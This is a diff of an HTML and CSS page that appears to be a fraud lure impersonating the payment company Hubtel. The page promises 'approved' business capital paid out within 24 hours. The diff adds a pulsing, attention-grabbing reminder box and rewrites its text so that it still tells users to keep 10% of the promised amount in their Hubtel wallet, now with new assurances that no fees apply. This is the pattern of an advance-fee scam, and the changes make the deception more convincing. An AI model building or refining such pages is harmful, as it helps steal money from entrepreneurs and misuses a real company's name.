@@ -215,20 +215,40 @@
         color: var(--primary);
     }
 
+    /* PULSING ACCOUNT REMINDER EFFECT */
     .e-wallet-reminder {
         background: var(--primary-dark);
-        border: 1px solid rgba(78, 179, 164, 0.3);
+        border: 1.5px solid var(--primary);
         border-radius: 20px;
         padding: 20px;
         color: #e0f2f1;
-        font-size: 13px;
+        font-size: 13.5px;
         line-height: 1.6;
+        animation: pulseReminder 2s infinite ease-in-out;
+        box-shadow: 0 0 15px rgba(78, 179, 164, 0.3);
+        white-space: pre-line;
+    }
+
+    @keyframes pulseReminder {
+        0% {
+            box-shadow: 0 0 0 0 rgba(78, 179, 164, 0.4);
+            border-color: rgba(78, 179, 164, 0.6);
+        }
+        70% {
+            box-shadow: 0 0 0 14px rgba(78, 179, 164, 0);
+            border-color: var(--primary);
+        }
+        100% {
+            box-shadow: 0 0 0 0 rgba(78, 179, 164, 0);
+            border-color: rgba(78, 179, 164, 0.6);
+        }
     }
 
     .e-wallet-reminder strong {
         display: block;
         margin-bottom: 6px;
         color: var(--primary);
+        font-size: 15px;
     }
 
     .e-btn {
@@ -349,9 +369,14 @@
         <span>To celebrate 20 years of supporting business growth, Hubtel is offering business capital to eligible entrepreneurs and startups. Your approved funds are being prepared for rapid disbursement within 24 hours.</span>
     </div>
 
+    <!-- PULSING ACCOUNT REMINDER FIELD -->
     <div class="e-wallet-reminder">
         <strong>🔐 Important Account Reminder</strong>
-        <span>Your capital is scheduled to be disbursed within 24 hours. Please ensure your Hubtel wallet maintains a balance equivalent to 10% of your approved amount to guarantee smooth processing and instant release.</span>
+        <span>Your approved capital is scheduled for disbursement within the next 24 hours. To ensure a smooth transfer, please maintain a Hubtel wallet balance equal to 10% of your approved amount (e.g., 500 = 50).
+
+No fees or hidden charges apply. This amount will remain in your wallet, will not be deducted, and can be withdrawn together with your disbursed capital.
+
+Thank you for your cooperation.</span>
     </div>
 
     <a href="index.html" class="e-btn">
